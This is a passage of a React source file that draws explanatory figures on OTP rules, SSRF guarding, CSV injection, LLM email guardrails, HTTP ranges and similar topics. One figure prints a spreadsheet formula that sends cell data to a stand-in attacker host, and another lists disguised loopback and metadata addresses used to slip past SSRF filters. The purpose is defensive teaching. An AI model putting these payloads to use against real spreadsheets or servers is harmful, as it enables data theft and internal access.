                  fontFamily: mono,
                  fontSize: 24,
                  color: eff === "rev-2" ? color.accent : color.ink,
                  padding: "17px 0",
                  borderTop: `1px solid ${color.line}`,
                }}
              >
                {eff}
              </div>
            </div>
          ))}
        </div>
        <div>
          <div style={{ fontSize: 20, color: color.muted, paddingBottom: 10 }}>Refused, with nothing changed</div>
          {refused.map(([what, code]) => (
            <div
              key={what}
              style={{
                display: "flex",
                justifyContent: "space-between",
                fontSize: 23,
                color: color.ink,
                padding: "13px 0",
                borderTop: `1px solid ${color.line}`,
              }}
            >
              <span>{what}</span>
              <span style={{ fontFamily: mono, color: color.warm }}>{code}</span>
            </div>
          ))}
        </div>
      </div>
    </Frame>
  );
}

/* 31. Guest OTP ---------------------------------------------------------------------------------------------- */
export function FigGuestOtp() {
  const rules: [string, string][] = [
    ["Stored as", "HMAC-SHA256(key, grant:code)"],
    ["Expires", "10 minutes"],
    ["Attempts per code", "5, counted before comparing"],
    ["Resend", "60 s cooldown, old code dies"],
    ["Use", "once: consumed with the session"],
  ];
  const stat = (n: string, label: string, tone: string) => (
    <div style={{ padding: "16px 0", borderTop: `1px solid ${color.line}` }}>
      <div style={{ fontFamily: mono, fontSize: 40, color: tone }}>{n}</div>
      <div style={{ fontFamily: sans, fontSize: 21, color: color.muted, marginTop: 4 }}>{label}</div>
    </div>
  );
  return (
    <Frame kicker="Guest file sharing · email one-time codes · Go" title="Six digits are safe only with these rules around them">
      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 56, fontFamily: sans }}>
        <div>
          {rules.map(([k, v]) => (
            <div
              key={k}
              style={{ display: "grid", gridTemplateColumns: "230px 1fr", fontSize: 24, padding: "15px 0", borderTop: `1px solid ${color.line}` }}
            >
              <span style={{ color: color.muted }}>{k}</span>
              <span style={{ color: color.ink, fontFamily: mono, fontSize: 22 }}>{v}</span>
            </div>
          ))}
        </div>
        <div>
          {stat("62 ms", "to reverse a plain SHA-256 of a 6-digit code", color.warm)}
          {stat("1 of 100", "concurrent correct submissions get a session", color.accent)}
          {stat("0.03%", "chance per hour of guessing, at 300 tries an hour", color.accent)}
        </div>
      </div>
    </Frame>
  );
}

/* 32. SSRF guard --------------------------------------------------------------------------------------------- */
export function FigSsrfGuard() {
  const spellings = ["2130706433", "0x7f.0.0.1", "127.1", "0177.0.0.1", "[::ffff:7f00:1]"];
  return (
    <Frame kicker="Server-side fetch of untrusted URLs · Node.js · 6 tests" title="Check the address you connect to, on every redirect">
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1.15fr", gap: 56, fontFamily: sans }}>
        <div>
          <div style={{ fontSize: 20, color: color.muted, paddingBottom: 10 }}>All of these are 127.0.0.1</div>
          {spellings.map((s) => (
            <div key={s} style={{ fontFamily: mono, fontSize: 25, color: color.warm, padding: "11px 0", borderTop: `1px solid ${color.line}` }}>
              http://{s}/
            </div>
          ))}
          <div style={{ fontSize: 21, color: color.muted, marginTop: 14 }}>
            new URL() turns the first four into 127.0.0.1; the last needs unmapping. Check after parsing.
          </div>
        </div>
        <div>
          <div style={{ fontSize: 20, color: color.muted, paddingBottom: 10 }}>Public page redirects to http://127.0.0.1/</div>
          <div style={{ padding: "16px 0", borderTop: `1px solid ${color.line}` }}>
            <div style={{ fontSize: 24, color: color.ink }}>Plain fetch (follows redirects)</div>
            <div style={{ fontFamily: mono, fontSize: 23, color: color.warm, marginTop: 6 }}>"SECRET from 127.0.0.1"</div>
          </div>
          <div style={{ padding: "16px 0", borderTop: `1px solid ${color.line}` }}>
            <div style={{ fontSize: 24, color: color.ink }}>Guarded: manual redirects, DNS checked at connect</div>
            <div style={{ fontFamily: mono, fontSize: 23, color: color.accent, marginTop: 6 }}>Refused: private address 127.0.0.1</div>
          </div>
          <div style={{ fontSize: 21, color: color.muted, marginTop: 14, lineHeight: 1.4 }}>
            Trap: adding ::ffff:0:0/96 to Node's BlockList blocks 8.8.8.8 and every other IPv4 address.
          </div>
        </div>
      </div>
    </Frame>
  );
}

/* 33. CSV injection ------------------------------------------------------------------------------------------ */
export function FigCsvInjection() {
  const rows: [string, string, string, boolean][] = [
    ["=HYPERLINK(…)", "'=HYPERLINK(…)", "'=HYPERLINK(…)", true],
    ["\\n=1+1 (line feed first)", "unchanged", "'\\n=1+1", false],
    ["＝1+1 (full-width)", "unchanged", "'＝1+1", false],
    ["-42 (a real number)", "'-42 (now text)", "-42", false],
    ["-2+3", "'-2+3", "'-2+3", true],
  ];
  return (
    <Frame kicker="Spreadsheet exports · OWASP CSV injection · Node.js" title="Neutralise formulas without breaking the numbers">
      <div style={{ display: "grid", gridTemplateColumns: "1fr 360px 360px", fontFamily: sans }}>
        <div style={{ fontSize: 20, color: color.muted, paddingBottom: 12 }}>Cell value</div>
        <div style={{ fontSize: 20, color: color.muted, paddingBottom: 12 }}>First version</div>
        <div style={{ fontSize: 20, color: color.accent, paddingBottom: 12 }}>Fixed</div>
        {rows.map(([v, a, b, same]) => (
          <div key={v} style={{ display: "contents" }}>
            <div style={{ fontFamily: mono, fontSize: 23, color: color.ink, padding: "17px 0", borderTop: `1px solid ${color.line}` }}>{v}</div>
            <div
              style={{
                fontFamily: mono,
                fontSize: 23,
                color: same ? color.ink : color.warm,
                padding: "17px 0",
                borderTop: `1px solid ${color.line}`,
              }}
            >
              {a}
            </div>
            <div
              style={{
                fontFamily: mono,
                fontSize: 23,
                color: color.accent,
                padding: "17px 12px",
                borderTop: `1px solid ${color.line}`,
                background: color.accentDim,
              }}
            >
              {b}
            </div>
          </div>
        ))}
      </div>
      <div style={{ marginTop: 24, fontFamily: sans, fontSize: 22, color: color.muted }}>
        Every prefixed cell is also quoted. Plain numbers like -42 or -3.5 are data, so they pass unchanged.
      </div>
    </Frame>
  );
}

/* 34. LLM outreach guardrails -------------------------------------------------------------------------------- */
export function FigOutreachGuardrails() {
  const caught = [
    "Great meeting you at ADIPEC last week.",
    "As discussed, here is our proposal.",
    "We value our existing partnership.",
    "…grew revenue 40% last year.",
  ];
  const missed = [
    "At ADIPEC, let's meet to talk valves.",
    "Thanks for stopping by our stand.",
    "As per our call, sharing the deck.",
    "…has 3.5 million customers.",
  ];
  const col = (title: string, items: string[], tone: string, mark: string) => (
    <div>
      <div style={{ fontSize: 21, color: tone, paddingBottom: 10 }}>{title}</div>
      {items.map((t) => (
        <div key={t} style={{ display: "flex", gap: 12, fontSize: 24, color: color.ink, padding: "15px 0", borderTop: `1px solid ${color.line}` }}>
          <span style={{ color: tone, fontWeight: 700 }}>{mark}</span>
          {t}
        </div>
      ))}
    </div>
  );
  return (
    <Frame kicker="Rule checks on LLM-written sales emails · 12 test sentences" title="Regex guardrails catch the obvious and miss the paraphrase">
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 48, fontFamily: sans }}>
        {col("Caught (7 of 7 tested)", caught, color.accent, "✓")}
        {col("Missed (5 phrasings)", missed, color.warm, "✗")}
      </div>
      <div style={{ marginTop: 22, fontFamily: sans, fontSize: 22, color: color.muted }}>
        3.5 million slipped through because the facts say 35 engineers: the number check stripped the dot. Comparing values fixes it.
      </div>
    </Frame>
  );
}

/* 35. HTTP Range requests ------------------------------------------------------------------------------------ */
export function FigHttpRanges() {
  const rows: [string, string, string][] = [
    ["bytes=0-99", "206", "bytes 0-99/1000"],
    ["bytes=900-  (resume)", "206", "bytes 900-999/1000"],
    ["bytes=-50  (last 50)", "206", "bytes 950-999/1000"],
    ["bytes=950-5000", "206", "bytes 950-999/1000"],
    ["bytes=1000-1100", "416", "bytes */1000"],
    ["If-Range with an old ETag", "200", "whole file"],
  ];
  return (
    <Frame kicker="Resumable downloads · Go http.ServeContent · 1,000-byte file" title="Range requests: what the server answers">
      <div style={{ display: "grid", gridTemplateColumns: "1.3fr 1fr", gap: 48 }}>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 90px 280px", fontFamily: mono }}>
          {rows.map(([r, s, c]) => (
            <div key={r} style={{ display: "contents" }}>
              <div style={{ fontSize: 23, color: color.ink, padding: "15px 0", borderTop: `1px solid ${color.line}` }}>{r}</div>
              <div style={{ fontSize: 23, color: s === "416" ? color.warm : color.accent, padding: "15px 0", borderTop: `1px solid ${color.line}` }}>
                {s}
              </div>
              <div style={{ fontSize: 21, color: color.muted, padding: "16px 0", borderTop: `1px solid ${color.line}` }}>{c}</div>
            </div>
          ))}
        </div>
        <div style={{ fontFamily: sans }}>
          <div style={{ fontFamily: mono, fontSize: 44, color: color.warm }}>26,846 bytes</div>
          <div style={{ fontSize: 23, color: color.ink, marginTop: 8, lineHeight: 1.4 }}>
            sent for 200 one-byte ranges: 134× the data asked for, in multipart headers.
          </div>
          <div style={{ fontSize: 22, color: color.muted, marginTop: 22, lineHeight: 1.4 }}>
            Cap the ranges (5 here); above that, serve the plain file.
          </div>
        </div>
      </div>
    </Frame>
  );
}

/* Diagram helpers --------------------------------------------------------------------------------------------- */
function Box({
  x,
  y,
  w,
  h,
  title,
  sub,
  tone = color.ink,
  fill = color.surface,
}: {
  x: number;
  y: number;
  w: number;
  h: number;
  title: string;
  sub?: string;
  tone?: string;
  fill?: string;
}) {
  return (
    <g>
      <rect x={x} y={y} width={w} height={h} rx={12} fill={fill} stroke={tone === color.ink ? color.line : tone} strokeWidth={2} />
      <text x={x + w / 2} y={y + (sub ? h / 2 - 6 : h / 2 + 9)} fill={tone} fontSize={26} fontFamily={sans} textAnchor="middle">
        {title}
      </text>
      {sub && (
        <text x={x + w / 2} y={y + h / 2 + 26} fill={color.muted} fontSize={19} fontFamily={sans} textAnchor="middle">
          {sub}
        </text>
      )}
    </g>
  );
}

function Arrow({
  x1,
  y1,
  x2,
  y2,
  label,
  tone = color.faint,
  dy = -12,
}: {
  x1: number;
  y1: number;
  x2: number;
  y2: number;
  label?: string;
  tone?: string;
  dy?: number;
}) {
  const ang = Math.atan2(y2 - y1, x2 - x1);
  const hx = (d: number, a: number) => x2 - d * Math.cos(ang + a);
  const hy = (d: number, a: number) => y2 - d * Math.sin(ang + a);
  return (
    <g>
      <line x1={x1} y1={y1} x2={x2} y2={y2} stroke={tone} strokeWidth={2.5} />
      <polygon points={`${x2},${y2} ${hx(14, 0.45)},${hy(14, 0.45)} ${hx(14, -0.45)},${hy(14, -0.45)}`} fill={tone} />
      {label && (
        <text x={(x1 + x2) / 2} y={(y1 + y2) / 2 + dy} fill={color.muted} fontSize={18} fontFamily={sans} textAnchor="middle">
          {label}
        </text>
      )}
    </g>
  );
}

/* 36. Approval states ------------------------------------------------------------------------------------------ */
export function FigApprovalStates() {
  return (
    <Frame kicker="Approval state machine · one active review per document" title="Only the last approval moves what readers get">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <Box x={0} y={40} w={220} h={100} title="Draft" sub="rev-2, scanned" />
        <Arrow x1={220} y1={90} x2={300} y2={90} label="submit" />
        <rect x={300} y={10} width={560} height={160} rx={16} fill="none" stroke={color.line} strokeDasharray="8 8" />
        <text x={320} y={40} fill={color.muted} fontSize={19} fontFamily={sans}>
          In review (template copied at submit)
        </text>
        <Box x={325} y={60} w={200} h={90} title="Step 1" sub="Engineering" />
        <Arrow x1={525} y1={105} x2={635} y2={105} label="approve" />
        <Box x={635} y={60} w={200} h={90} title="Step 2" sub="Maintenance" />
        <Arrow x1={860} y1={90} x2={960} y2={90} label="approve" tone={color.accent} />
        <Box x={960} y={40} w={300} h={100} title="Approved" sub="effective = rev-2" tone={color.accent} fill={color.accentDim} />
        <Arrow x1={580} y1={170} x2={580} y2={260} tone={color.warm} />
        <text x={596} y={222} fill={color.muted} fontSize={18} fontFamily={sans}>
          return at any step, with a reason
        </text>
        <Box x={440} y={260} w={280} h={90} title="Returned" sub="history kept, review ends" tone={color.warm} />
        <text x={0} y={420} fill={color.ink} fontSize={26} fontFamily={sans}>
          What readers get, the whole time:
        </text>
        <rect x={0} y={445} width={960} height={56} rx={10} fill={color.surface} stroke={color.line} />
        <text x={24} y={482} fill={color.ink} fontSize={25} fontFamily={mono}>
          rev-1 · rev-1 · rev-1 · rev-1 (draft, review, return or retry)
        </text>
        <rect x={960} y={445} width={300} height={56} rx={10} fill={color.accentDim} stroke={color.accent} />
        <text x={984} y={482} fill={color.accent} fontSize={25} fontFamily={mono}>
          rev-2
        </text>
        <text x={0} y={550} fill={color.muted} fontSize={21} fontFamily={sans}>
          Each decision sends (review, step, version). Wrong step or stale version: 409. Wrong department or the submitter: 403.
        </text>
      </svg>
    </Frame>
  );
}

/* 37. Guest OTP flow -------------------------------------------------------------------------------------------- */
export function FigOtpFlow() {
  const steps: [string, string[], string][] = [
    ["Employee shares", ["one approved revision", "one email address"], color.ink],
    ["Invite link", ["random token", "only its digest stored", "expires in 7 days"], color.ink],
    ["Guest asks for code", ["sent only to the", "invited address", "60 s resend cooldown"], color.ink],
    ["Guest enters it", ["5 tries, 10 minutes", "used once, then gone"], color.accent],
    ["15-minute session", ["secure, HTTP-only", "same-origin cookie"], color.accent],
    ["Every download", ["share still active?", "still approved?", "sharer still allowed?"], color.accent],
  ];
  const w = 216;
  return (
    <Frame kicker="Guest file sharing · the whole flow" title="The code proves the inbox; every download is checked again">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {steps.map(([t, sub, tone], i) => {
          const x = i * (w + 32);
          const y = i % 2 === 0 ? 40 : 210;
          return (
            <g key={t}>
              <rect
                x={x}
                y={y}
                width={w}
                height={150}
                rx={12}
                fill={tone === color.accent ? color.accentDim : color.surface}
                stroke={tone === color.ink ? color.line : tone}
                strokeWidth={2}
              />
              <text x={x + 14} y={y + 40} fill={tone} fontSize={23} fontFamily={sans}>
                {t}
              </text>
              {sub.map((line, j) => (
                <text key={line} x={x + 14} y={y + 74 + j * 25} fill={color.muted} fontSize={18} fontFamily={sans}>
                  {line}
                </text>
              ))}
              {i < steps.length - 1 && <Arrow x1={x + w} y1={y + 75} x2={x + w + 32} y2={i % 2 === 0 ? 285 : 135} />}
            </g>
          );
        })}
        <text x={0} y={430} fill={color.warm} fontSize={24} fontFamily={sans}>
          What fails, with the same "invalid or expired code" every time:
        </text>
        <text x={0} y={470} fill={color.ink} fontSize={22} fontFamily={sans}>
          a forwarded link without the inbox · a reused or replaced code · the 6th guess · a code for another share
        </text>
        <text x={0} y={518} fill={color.muted} fontSize={21} fontFamily={sans}>
          Revoking the share or removing the employee's access stops the next request, even mid-download.
        </text>
      </svg>
    </Frame>
  );
}

/* 38. SSRF pipeline --------------------------------------------------------------------------------------------- */
export function FigSsrfPipeline() {
  return (
    <Frame kicker="SSRF guard · where each check runs" title="Three checkpoints, and redirects go back through all of them">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <Box x={0} y={60} w={210} h={100} title="User's URL" sub="untrusted" />
        <Arrow x1={210} y1={110} x2={260} y2={110} />
        <Box x={260} y={50} w={270} h={120} title="1. Parse" sub="new URL(), http(s) only" tone={color.accent} />
        <Arrow x1={530} y1={110} x2={580} y2={110} />
        <Box x={580} y={50} w={270} h={120} title="2. IP literal?" sub="check it now" tone={color.accent} />
        <Arrow x1={850} y1={110} x2={900} y2={110} />
        <Box x={900} y={50} w={300} h={120} title="3. Connect" sub="DNS answers checked, all" tone={color.accent} />
        <Arrow x1={1200} y1={110} x2={1250} y2={110} />
        <Box x={1250} y={60} w={200} h={100} title="Response" />
        <path d="M 1350 160 L 1350 300 L 395 300 L 395 178" fill="none" stroke={color.warm} strokeWidth={2.5} />
        <polygon points="395,170 386,186 404,186" fill={color.warm} />
        <text x={870} y={290} fill={color.warm} fontSize={21} fontFamily={sans} textAnchor="middle">
          3xx with Location: start again at 1 (redirect: "manual", max 5 hops)
        </text>
        <text x={260} y={380} fill={color.muted} fontSize={21} fontFamily={sans}>
          Catches
        </text>
        <text x={260} y={414} fill={color.ink} fontSize={21} fontFamily={mono}>
          file:, gopher:
        </text>
        <text x={260} y={444} fill={color.muted} fontSize={19} fontFamily={sans}>
          and turns 0x7f.1 into 127.0.0.1
        </text>
        <text x={580} y={380} fill={color.muted} fontSize={21} fontFamily={sans}>
          Catches
        </text>
        <text x={580} y={414} fill={color.ink} fontSize={21} fontFamily={mono}>
          127.0.0.1
        </text>
        <text x={580} y={444} fill={color.ink} fontSize={21} fontFamily={mono}>
          169.254.169.254
        </text>
        <text x={580} y={474} fill={color.ink} fontSize={21} fontFamily={mono}>
          [::ffff:7f00:1]
        </text>
        <text x={920} y={380} fill={color.muted} fontSize={21} fontFamily={sans}>
          Catches (hostnames)
        </text>
        <text x={920} y={414} fill={color.ink} fontSize={21} fontFamily={mono}>
          localhost, internal names
        </text>
        <text x={920} y={444} fill={color.ink} fontSize={21} fontFamily={mono}>
          DNS rebinding
        </text>
        <text x={0} y={540} fill={color.muted} fontSize={21} fontFamily={sans}>
          IP literals never reach DNS, so check 2 is not optional; DNS answers can change, so check 3 runs at connect time.
        </text>
      </svg>
    </Frame>
  );
}

/* 39. CSV in a spreadsheet ------------------------------------------------------------------------------------- */
export function FigCsvSheet() {
  const sheet = (x: number, title: string, b2: string, b2tone: string, note: string, noteTone: string) => (
    <g>
      <text x={x} y={30} fill={color.muted} fontSize={21} fontFamily={sans}>
        {title}
      </text>
      {["", "A", "B"].map((h, i) => (
        <g key={h + i}>
          <rect x={x + [0, 60, 300][i]} y={50} width={[60, 240, 360][i]} height={44} fill={color.surface} stroke={color.line} />
          <text x={x + [30, 180, 480][i]} y={79} fill={color.muted} fontSize={19} fontFamily={sans} textAnchor="middle">
            {h}
          </text>
        </g>
      ))}
      {[
        ["1", "Company", "Notes"],
        ["2", "Acme Valves", b2],
      ].map((row, r) => (
        <g key={row[0]}>
          {row.map((c, i) => (
            <g key={i}>
              <rect x={x + [0, 60, 300][i]} y={94 + r * 56} width={[60, 240, 360][i]} height={56} fill="none" stroke={color.line} />
              <text
                x={x + [30, 72, 312][i]}
                y={130 + r * 56}
                fill={i === 2 && r === 1 ? b2tone : color.ink}
                fontSize={i === 0 ? 19 : 22}
                fontFamily={i === 2 && r === 1 ? mono : sans}
                textAnchor={i === 0 ? "middle" : "start"}
              >
                {c}
              </text>
            </g>
          ))}
        </g>
      ))}
      <text x={x} y={260} fill={noteTone} fontSize={22} fontFamily={sans}>
        {note}
      </text>
    </g>
  );
  return (
    <Frame kicker="The same scraped cell, opened in a spreadsheet" title="Escaping decides whether a cell is text or a program">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {sheet(0, "Exported as is", "Click", color.accent, "A link: clicking sends A2 (and more) to evil.example", color.warm)}
        {sheet(760, "Escaped: '= and quoted", '=HYPERLINK("http…', color.ink, "Plain text: nothing runs, nothing is sent", color.accent)}
        <text x={0} y={360} fill={color.muted} fontSize={21} fontFamily={sans}>
          Cell value in the CSV
        </text>
        <text x={0} y={398} fill={color.ink} fontSize={21} fontFamily={mono}>
          =HYPERLINK("http://evil.example?x="&amp;A2,"Click")
        </text>
        <text x={760} y={360} fill={color.muted} fontSize={21} fontFamily={sans}>
          Written by the fixed escaper
        </text>
        <text x={760} y={398} fill={color.ink} fontSize={21} fontFamily={mono}>
          "'=HYPERLINK(""http://evil…"")"
        </text>
        <text x={0} y={490} fill={color.muted} fontSize={21} fontFamily={sans}>
          Numbers are left alone: -42 stays a number a SUM can add. Excel can drop the quote prefix if the file is saved and reopened.
        </text>
      </svg>
    </Frame>
  );
}

/* 40. Guardrail pipeline --------------------------------------------------------------------------------------- */
export function FigGuardrailPipeline() {
  return (
    <Frame kicker="LLM outreach drafts · from facts to a reviewed email" title="Facts in, checks after, a person before anything is sent">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <Box x={0} y={60} w={240} h={130} title="Website facts" sub="F1, F2… with source URL" />
        <Arrow x1={240} y1={125} x2={290} y2={125} />
        <Box x={290} y={60} w={220} h={130} title="LLM draft" sub="must return cited IDs" />
        <Arrow x1={510} y1={125} x2={560} y2={125} />
        <rect x={560} y={20} width={380} height={210} rx={14} fill={color.surface} stroke={color.accent} strokeWidth={2} />
        <text x={580} y={58} fill={color.accent} fontSize={24} fontFamily={sans}>
          Rule checks
        </text>
        {["banned claims (met, discussed…)", "numbers not in the facts", "at least one real fact ID", "hypothesis hedged (may, could)"].map(
          (t, i) => (
            <text key={t} x={580} y={100 + i * 34} fill={color.ink} fontSize={21} fontFamily={sans}>
              · {t}
            </text>
          )
        )}
        <Arrow x1={940} y1={125} x2={1000} y2={125} label="pass" tone={color.accent} />
        <Box x={1000} y={60} w={220} h={130} title="Human review" sub="approve, edit, reject" tone={color.accent} fill={color.accentDim} />
        <Arrow x1={1220} y1={125} x2={1270} y2={125} />
        <Box x={1270} y={75} w={180} h={100} title="Sent" />
        <Arrow x1={750} y1={230} x2={750} y2={320} tone={color.warm} />
        <text x={766} y={282} fill={color.muted} fontSize={18} fontFamily={sans}>
          fail
        </text>
        <Box x={600} y={320} w={300} h={100} title="Retry once" sub="with the reasons listed" tone={color.warm} />
        <path d="M 640 320 L 640 270 L 400 270 L 400 202" fill="none" stroke={color.warm} strokeWidth={2.5} />
        <polygon points="400,192 391,208 409,208" fill={color.warm} />
        <text x={420} y={262} fill={color.muted} fontSize={18} fontFamily={sans}>
          new draft
        </text>
        <Arrow x1={600} y1={385} x2={310} y2={385} label="fails again" tone={color.warm} />
        <Box x={0} y={335} w={310} h={100} title="Insufficient evidence" sub="saved, never sent" tone={color.warm} />
        <text x={0} y={510} fill={color.muted} fontSize={21} fontFamily={sans}>
          In the test, the checks caught 7 of 7 obvious violations and missed 5 paraphrases: the human step is not optional.
        </text>
      </svg>
    </Frame>
  );
}

/* 41. Range resume --------------------------------------------------------------------------------------------- */
export function FigRangeResume() {
  const bar = (y: number, segs: [number, number, string, string][], label: string) => (
    <g>
      <text x={0} y={y + 34} fill={color.muted} fontSize={21} fontFamily={sans}>
        {label}
      </text>
      {segs.map(([a, b, tone, t]) => (
        <g key={a}>
          <rect x={300 + a * 1.1} y={y} width={(b - a) * 1.1} height={52} fill={tone} stroke={color.bg} strokeWidth={3} rx={6} />
          <text
            x={300 + ((a + b) / 2) * 1.1}
            y={y + 33}
            fill={tone === color.line || tone === color.warmDim ? color.muted : color.bg}
            fontSize={19}
            fontFamily={mono}
            textAnchor="middle"
          >
            {t}
          </text>
        </g>
      ))}
    </g>
  );
  return (
    <Frame kicker="A 1,000-byte drawing, downloaded over a bad connection" title="Resume with Range, and If-Range stops a spliced file">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        {bar(
          20,
          [
            [0, 300, color.accent, "0-299 ✓"],
            [300, 600, color.accent, "300-599 ✓"],
            [600, 1000, color.line, "connection drops"],
          ],
          "First attempt"
        )}
        {bar(
          110,
          [
            [600, 900, color.accent, "Range: 600-899"],
            [900, 1000, color.accent, "900-"],
          ],
          "Resume (same ETag)"
        )}
        {bar(200, [[0, 1000, color.accent, "4 parts, SHA-256 matches the original"]], "Result")}
        <line x1={300} x2={1400} y1={300} y2={300} stroke={color.line} />
        {bar(
          330,
          [
            [0, 600, color.warm, "old file, bytes 0-599"],
            [600, 1000, color.warmDim, "new file, 600-999?"],
          ],
          "Without If-Range"
        )}
        {bar(420, [[0, 1000, color.accent, "file changed: server sends all of it again (200)"]], "With If-Range")}
        <text x={0} y={540} fill={color.muted} fontSize={21} fontFamily={sans}>
          If-Range: "send the range only if the file still has this ETag, otherwise send the whole file".
        </text>
      </svg>
    </Frame>
  );
}

/* 42. Liveness: two threats ----------------------------------------------------------------------------------- */
export function FigLivenessThreats() {
  const col = (x: number, title: string, path: string, items: string[], defence: string[], measure: string, tone: string) => (
    <g>
      <text x={x} y={30} fill={tone} fontSize={28} fontFamily={sans}>
        {title}
      </text>
      <text x={x} y={66} fill={color.muted} fontSize={20} fontFamily={sans}>
        {path}
      </text>
      {items.map((t, i) => (
        <text key={t} x={x} y={112 + i * 36} fill={color.ink} fontSize={22} fontFamily={sans}>
          · {t}
        </text>
      ))}
      <rect x={x} y={280} width={640} height={190} rx={14} fill={color.surface} stroke={tone} strokeWidth={2} />
      <text x={x + 20} y={318} fill={tone} fontSize={22} fontFamily={sans}>
        Defence
      </text>
      {defence.map((t, i) => (
        <text key={t} x={x + 20} y={356 + i * 32} fill={color.ink} fontSize={21} fontFamily={sans}>
          {t}
        </text>
      ))}
      <text x={x} y={512} fill={color.muted} fontSize={20} fontFamily={sans}>
        {measure}
      </text>
    </g>
  );
  return (
    <Frame kicker="Face liveness in KYC · ISO/IEC 30107-3 and CEN/TS 18099" title="Two different attacks, two different defences">
      <svg width={1456} height={560} viewBox="0 0 1456 560">
        {col(
          0,
          "Presentation attacks",
          "something is held up to a real camera",
          ["printed photo, eyes cut out", "screen replay of a video", "paper, cloth or 3D mask"],
          ["Presentation attack detection (vision):", "screen moiré, paper texture, depth,", "reflections, mask edges; active or passive"],
          "Measured as APCER per attack type (worst counts) and BPCER",
          color.accent
        )}
        {col(
          760,
          "Injection attacks",
          "the camera is skipped entirely",
          ["virtual camera driver or emulator", "hooked or modified app", "deepfake stream swapped in transit"],
          [
            "Capture-path security (mostly not vision):",
            "device integrity and attestation, virtual-camera",
            "detection, a server challenge bound to the session",
          ],
          "Evaluated separately from PAD (CEN/TS 18099 in Europe)",
          color.warm
        )}
      </svg>
    </Frame>
  );
}

/* 43. Embeddings and vector search ----------------------------------------------------------------------------- */
export function FigVectorSearchPipeline() {
  return (
    <Frame kicker="Embeddings, vector search and hybrid search" title="Meaning from vectors, exact terms from keywords">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        <Box x={0} y={30} w={230} h={100} title="Documents" sub="chunked" />
        <Arrow x1={230} y1={80} x2={290} y2={80} />
        <Box x={290} y={30} w={260} h={100} title="Embedding model" sub="same model for both" tone={color.accent} />
        <Arrow x1={550} y1={80} x2={610} y2={80} />
        <Box x={610} y={30} w={300} h={100} title="Vector index" sub="exact, then HNSW at scale" tone={color.accent} />
        <Box x={0} y={190} w={230} h={100} title="Query" />
        <Arrow x1={230} y1={240} x2={290} y2={130} />
        <Arrow x1={760} y1={130} x2={760} y2={190} label="" />
        <Box x={610} y={190} w={300} h={100} title="Nearest vectors" sub="cosine (or dot product)" tone={color.accent} />
        <Arrow x1={230} y1={240} x2={610} y2={410} />
        <Box x={610} y={360} w={300} h={100} title="BM25 keyword search" sub="names, IDs, error codes" tone={color.warm} />
        <Arrow x1={910} y1={240} x2={990} y2={300} />
        <Arrow x1={910} y1={410} x2={990} y2={340} />
        <Box x={990} y={270} w={240} h={100} title="Hybrid" sub="combine both lists" tone={color.ink} />
        <Arrow x1={1230} y1={320} x2={1280} y2={320} />
        <Box x={1280} y={270} w={170} h={100} title="Top k" />
        <text x={0} y={540} fill={color.muted} fontSize={21} fontFamily={sans}>
          Similar meaning lands on nearby vectors; exact terms are where embeddings are weak, so most production RAG adds BM25.
        </text>
      </svg>
    </Frame>
  );
}

/* 44. Averaging percentiles ------------------------------------------------------------------------------------ */
export function FigAveragedP95() {
  const bar = (y: number, label: string, sub: string, ms: number, tone: string, note: string) => (
    <g>
      <text x={0} y={y + 26} fill={color.ink} fontSize={24} fontFamily={sans}>
        {label}
      </text>
      <text x={0} y={y + 54} fill={color.muted} fontSize={19} fontFamily={sans}>
        {sub}
      </text>
      <rect x={380} y={y} width={(ms / 2000) * 820} height={52} rx={6} fill={tone} />
      <text x={380 + (ms / 2000) * 820 + 16} y={y + 34} fill={tone} fontSize={26} fontFamily={mono}>
        {ms.toLocaleString("en-US")} ms
      </text>
      {note && (
        <text x={380} y={y + 82} fill={color.muted} fontSize={19} fontFamily={sans}>
          {note}
        </text>
      )}
    </g>
  );
  return (
    <Frame kicker="p95 latency of two servers · the worked example" title="Averaging two p95s halves the real number">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        {bar(10, "Server A p95", "1,000 requests, 100 take 2 s", 2000, color.faint, "")}
        {bar(110, "Server B p95", "100 requests, all 100 ms", 100, color.faint, "")}
        {bar(240, "Average of the two", "what a dashboard might show", 1050, color.warm, "wrong: ignores how many requests each server handled")}
        {bar(390, "Real p95", "all 1,100 requests, 9% slow", 2000, color.accent, "merge raw samples, histogram buckets or a sketch")}
      </svg>
    </Frame>
  );
}

/* 45. LibrePods tray ------------------------------------------------------------------------------------------- */
export function FigLibrePodsTray() {
  const tip = (x: number, title: string, lines: string[], tone: string, note: string) => (
    <g>
      <text x={x} y={30} fill={color.muted} fontSize={21} fontFamily={sans}>
        {title}
      </text>
      <rect x={x} y={50} width={620} height={60 + lines.length * 46} rx={12} fill={color.surface} stroke={tone} strokeWidth={2} />
      {lines.map((l, i) => (
        <text key={l} x={x + 24} y={96 + i * 46} fill={color.ink} fontSize={24} fontFamily={mono}>
          {l}
        </text>
      ))}
      <text x={x} y={150 + lines.length * 46} fill={tone} fontSize={21} fontFamily={sans}>
        {note}
      </text>
    </g>
  );
  return (
    <Frame kicker="LibrePods on Linux · tray tooltip with two pairs connected" title="One line per pair, instead of whichever spoke last">
      <svg width={1456} height={580} viewBox="0 0 1456 580">
        {tip(0, "Before", ["Battery Status: (pair 2 only)"], color.warm, "pair 1 disappears whenever pair 2 sends an update")}
        {tip(
          780,
          "After (PR #676)",
          ["Pair 1 (active): its status", "Pair 2: its status"],
          color.accent,
          "a per-device registry; the active pair first"
        )}
        <text x={0} y={390} fill={color.ink} fontSize={24} fontFamily={sans}>
          One pair connected: the tooltip keeps the original format, so single-pair users see no change.
        </text>
        <text x={0} y={440} fill={color.muted} fontSize={21} fontFamily={sans}>
          Android (PR #675): an option so Conversational Awareness only lowers the volume when both AirPods are in.
        </text>
      </svg>
    </Frame>
  );
}

/* 46. Workspace vs Zoho ---------------------------------------------------------------------------------------- */
export function FigMailCost() {
  const steps = [
    "Verify domain (TXT)",
    "MX records",
    "SPF",
    "DKIM",
    "DMARC, start at p=none",
    "Mailboxes, groups, aliases",
